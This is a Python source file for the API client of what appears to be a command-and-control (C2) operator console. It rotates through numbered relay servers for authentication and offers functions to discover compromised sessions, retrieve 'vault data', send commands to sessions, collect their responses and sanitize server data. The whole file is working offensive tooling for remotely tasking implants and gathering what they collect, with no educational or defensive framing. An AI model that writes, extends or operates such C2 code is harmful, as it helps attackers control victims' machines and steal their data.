# C2_Client/api_client.py
import requests
import json
import logging
from config import RELAY_URL_FORMAT

class ApiClient:
    def __init__(self, main_window):
        self.main_window = main_window
        self.session = requests.Session()
        self.base_url = None 
        self.line_number = None

    def set_line(self, line_number):
        self.line_number = line_number
        self.base_url = RELAY_URL_FORMAT.format(line_number)
        logging.info(f"[API Client] Communication line set to: {self.base_url}")

    def _request(self, method, endpoint, **kwargs):
        if endpoint in ['/auth/login', '/auth/register', '/auth/delete']:
            for i in range(1, 11):
                url = RELAY_URL_FORMAT.format(i) + endpoint
                logging.debug(f"[API] Attempting {method} request to {url}")
                try:
                    # MODIFIED: Timeout increased to 45 seconds for auth requests
                    # This allows enough time for a free Render service to spin up from sleep.
                    response = self.session.request(method, url, timeout=45, **kwargs)
                    
                    if response.status_code < 500:
                        logging.debug(f"[API] Received definitive response from {url}: {response.status_code}")
                        try:
                            return response.json()
                        except json.JSONDecodeError:
                            logging.critical(f"[API FATAL] Server returned non-JSON response from {url}. Raw text: {response.text}")
                            return {"success": False, "error": f"Server error on line {i}: Not a valid JSON response."}
                except requests.exceptions.RequestException as e:
                    logging.warning(f"[API] Connection error on line {i}: {e}")
                    continue
            
            logging.error("API Error: Could not connect to any C2 line.")
            return None
        
        # Requests for an active session can have a shorter timeout
        if not self.base_url:
            logging.error("API Error: Not logged in or C2 line not set.")
            return None
            
        try:
            url = f"{self.base_url}{endpoint}"
            response = self.session.request(method, url, timeout=15, **kwargs)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            error_message = f"API Error: {e}"
            if e.response is not None:
                try:
                    error_details = e.response.json().get("error", "No details provided.")
                    error_message += f" - {error_details}"
                except: pass
            logging.error(error_message)
            return None

    def register(self, username, password):
        return self._request('POST', '/auth/register', json={'username': username, 'password': password})

    def login(self, username, password):
        return self._request('POST', '/auth/login', json={'username': username, 'password': password})

    def delete_account(self, username):
        return self._request('POST', '/auth/delete', json={'username': username})

    def discover_sessions(self, username):
        return self._request('POST', '/c2/discover', json={'username': username})

    def get_all_vault_data(self, username):
        return self._request('POST', '/c2/get_all_vault_data', json={'username': username})

    def get_responses(self, username, session_id):
        return self._request('POST', '/c2/get_responses', json={'username': username, 'session_id': session_id})

    def send_task(self, username, session_id, command):
        return self._request('POST', '/c2/task', json={'username': username, 'session_id': session_id, 'command': command})

    def sanitize_data(self, username):
        return self._request('POST', '/c2/sanitize', json={'username': username})